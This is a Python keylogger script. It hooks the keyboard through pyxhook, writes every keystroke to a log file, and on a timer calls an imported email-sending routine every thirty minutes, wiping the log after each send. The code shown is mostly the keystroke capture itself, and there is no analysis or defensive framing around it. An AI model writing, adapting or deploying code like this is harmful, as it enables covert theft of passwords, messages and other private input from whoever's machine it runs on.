import os 
import pyxhook 
import data
import threading
import email_send



def email_threading():
	email_send.send_data()
	
	if os.path.exists(os.path.expanduser(data.path)):
  		open(os.path.expanduser(data.path), 'w').close()
	t = threading.Timer(1800, email_threading)
	t.start()

email_threading()

log_file = os.environ.get( 
	'pylogger_file', 
	os.path.expanduser(data.path) 
) 

if os.environ.get('pylogger_clean', None) is not None: 
	try: 
		os.remove(log_file) 
	except EnvironmentError: 
		pass

def OnKeyPress(event): 
	with open(log_file, 'a') as f: 
		f.write('{}\n'.format(event.Key)) 

new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 

new_hook.HookKeyboard() 
try: 
	new_hook.start()
except KeyboardInterrupt: 
	pass
except Exception as ex: 
	msg = 'Error while catching events:\n {}'.format(ex) 
	pyxhook.print_err(msg) 
	with open(log_file, 'a') as f: 
		f.write('\n{}'.format(msg)) 
